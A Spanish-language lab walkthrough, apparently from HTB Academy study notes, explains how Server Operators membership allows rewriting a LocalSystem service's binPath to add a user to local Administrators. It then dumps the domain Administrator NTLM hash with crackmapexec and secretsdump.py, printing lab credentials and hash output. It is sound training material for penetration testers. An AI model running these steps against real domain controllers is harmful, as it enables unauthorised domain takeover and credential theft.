# Server Operators

## 1) Server Operators

* El grupo [*Server Operators*](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-serveroperators) permite a sus miembros administrar servidores Windows sin necesidad de pertenecer a *Domain Admins*.
* Es un grupo con muchos privilegios: puede iniciar sesión localmente en servidores (incluyendo Controladores de Dominio).

**Privilegios mencionados**

* `SeBackupPrivilege` y `SeRestorePrivilege`: privilegios potentes relacionados con respaldo y restauración de ficheros/volúmenes.
* Capacidad de controlar servicios locales.

---

## 2) Consultar el servicio AppReadiness

**Comando usado**:

```
sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem


```

**Explicación de la sintaxis**:

* `sc` : utilidad de Windows para controlar y consultar servicios (Service Control).
* `qc` : subcomando que significa *QueryConfig* (consulta la configuración del servicio especificado).
* `AppReadiness` : nombre del servicio a consultar.

**Salida clave y su significado**:

* `SERVICE_NAME: AppReadiness` → nombre interno del servicio.
* `TYPE : 20  WIN32_SHARE_PROCESS` → tipo de servicio; `WIN32_SHARE_PROCESS` indica que el ejecutable se comparte con otros servicios (svchost).
* `START_TYPE : 3   DEMAND_START` → inicio bajo demanda (no inicia automáticamente en arranque).
* `BINARY_PATH_NAME : C:\Windows\System32\svchost.exe -k AppReadiness -p` → ruta al binario que se ejecuta cuando se inicia el servicio; aquí es `svchost.exe` con el parámetro `-k AppReadiness`.
* `SERVICE_START_NAME : LocalSystem` → cuenta bajo la cual se ejecuta el servicio; `LocalSystem` es la cuenta SYSTEM del sistema operativo (máximos privilegios locales).

---

## 3) Comprobar permisos del servicio con PsService

**Herramienta**: [`PsService.exe`](https://learn.microsoft.com/es-es/sysinternals/downloads/psservice) (parte de Sysinternals). Funciona similar a `sc` pero puede mostrar detalles de seguridad y controlar servicios localmente o remotamente.

**Comando usado**:

```
C:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All


```

**Explicación de la sintaxis**:

* `C:\Tools\PsService.exe` : ruta al ejecutable de PsService.
* `security` : acción que solicita mostrar la información de seguridad (DACL) del servicio.
* `AppReadiness` : servicio objetivo.

**Fragmento de salida y significados**:

* `ACCOUNT: LocalSystem` → cuenta bajo la cual corre el servicio.
* `SECURITY:` → comienza el listado de ACEs (entradas de control de acceso) sobre el servicio.

Ejemplo de ACEs mostradas:

```
[ALLOW] NT AUTHORITY\SYSTEM
        Query status
        Query Config
        Interrogate
        Enumerate Dependents
        Pause/Resume
        Start
        Stop
        User-Defined Control
        Read Permissions
```

* `[ALLOW] NT AUTHORITY\SYSTEM` : la entidad `SYSTEM` tiene permisos permitidos.
* Las líneas siguientes enumeran permisos concretos (consultar estado, iniciar, detener, etc.).

Otra línea relevante:

```
[ALLOW] BUILTIN\Server Operators
        All
```

* `BUILTIN\Server Operators` tiene `All` sobre el servicio: significa control total (equivalente a [`SERVICE_ALL_ACCESS`](https://learn.microsoft.com/es-es/windows/win32/services/service-security-and-access-rights#access-rights-for-a-service)).
* Consecuencia: un miembro del grupo puede modificar la configuración del servicio, incluyendo la ruta del binario.

---

## 4) Verificar membresía del grupo Administradores local

**Comando usado**:

```
net localgroup Administrators
```

**Explicación**:

* `net localgroup <NombreGrupo>` lista la información y los miembros del grupo local especificado.
* En la salida se observa que *server_adm* NO figura todavía en Administrators.

Salida muestra por ejemplo:

```
Members
-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
```
---

## 5) Modificar la ruta binaria del servicio (Service Binary Path)

**Comando usado**:

```
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

**Explicación detallada de la sintaxis**:

* `sc config AppReadiness` : modifica la configuración del servicio `AppReadiness`.
* `binPath=` : parámetro que indica la nueva ruta del ejecutable que el servicio intentará correr cuando se inicie.

  * Nota de sintaxis: `sc` requiere el signo `=` y a menudo un espacio después (como aparece en el ejemplo).
* El valor entre comillas: `"cmd /c net localgroup Administrators server_adm /add"`.

  * `cmd` : invoca el intérprete de comandos de Windows.
  * `/c` : instrucción a `cmd` para que ejecute el comando que sigue y luego termine.
  * `net localgroup Administrators server_adm /add` : comando que añade la cuenta `server_adm` al grupo local `Administrators`.

**Resultado mostrado**:

```
[SC] ChangeServiceConfig SUCCESS
```

* Indica que la modificación de la configuración del servicio (binPath) fue aceptada.

---

## 6) Intento de iniciar el servicio

**Comando usado**:

```
sc start AppReadiness
```

**Resultado**:

```
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

**Interpretación**:

* Aunque la ruta binaria fue cambiada, al intentar iniciar el servicio Windows devolvió error `1053` indicando que el servicio no respondió correctamente al intento de inicio.
* Esto era esperado en el texto (no se esperaba que el servicio se iniciara correctamente con `cmd /c ...`).

---

## 7) Confirmación de membresía del Administrators local

**Comando usado de nuevo**:

```
net localgroup Administrators
```

**Salida clave**:

```
Administrator
Domain Admins
Enterprise Admins
server_adm
```

**Interpretación**:

* A pesar de que el servicio no arrancó normalmente, el efecto del `binPath` modificado (ejecución del `cmd /c net localgroup ...`) se ejecutó en algún momento y agregó `server_adm` al grupo `Administrators`.
* Ahora `server_adm` es miembro del grupo Administradores locales.

---

## 8) Confirmar acceso administrativo en el Controlador de Dominio

**Ejemplo de uso de herramientas para comprobar acceso**:

```
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```

**Explicación**:

* `crackmapexec smb <IP> -u <usuario> -p <password>` : intenta autenticación SMB con las credenciales dadas contra la IP objetivo.
* La salida indica acceso exitoso (`Pwn3d!`) y muestra detalles del host (nombre, versión de Windows, dominio).

---

## 9) Extracción de hashes NTLM desde el Controlador de Dominio

**Comando usado**:

```
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

**Explicación de la sintaxis**:

* `secretsdump.py` : herramienta de Impacket para extraer secretos (credenciales) desde un DC.
* `server_adm@10.129.43.9` : credenciales utilizadas (usuario `server_adm`) y dirección del DC.
* `-just-dc-user administrator` : opción para solicitar únicamente las credenciales del usuario `administrator` en el DC.

**Fragmentos de salida y su significado**:

* `[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)` : formato de las líneas que contendrán las credenciales: dominio\usuario:RID:LMHASH:NTHASH.
* Ejemplo de línea:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
```

* `Administrator` → nombre de cuenta.
* `500` → RID (identificador relativo) del usuario.
* `aad3...` → LM hash (a menudo un valor constante si LM no está usado).
* `cf3a...` → NT hash (NTLM hash) de la contraseña.
* También muestra las claves de Kerberos (`aes256-cts-hmac-sha1-96`, etc.) si están disponibles.

---

## 10) Resumen técnico estrictamente según el texto

* Ser miembro de `Server Operators` confiere controles sobre servicios (incluyendo `SERVICE_ALL_ACCESS` en AppReadiness en este ejemplo).
* Cambiar `binPath` de un servicio que corre como `LocalSystem` permite ejecutar comandos con los privilegios de `LocalSystem` cuando el servicio se inicia (la técnica aplicada aquí consistió en apuntar `binPath` a un `cmd /c` que modifica el grupo de Administradores locales).
* Aunque el servicio no se inicie correctamente (error 1053), la acción deseada (agregar el usuario al grupo Administrators) se completó.
* Con una cuenta local en Administrators sobre un Controlador de Dominio (o acceso administrativo al host), es posible autenticar contra el DC y extraer credenciales del AD (ejemplo con `crackmapexec` y `secretsdump.py`).

---
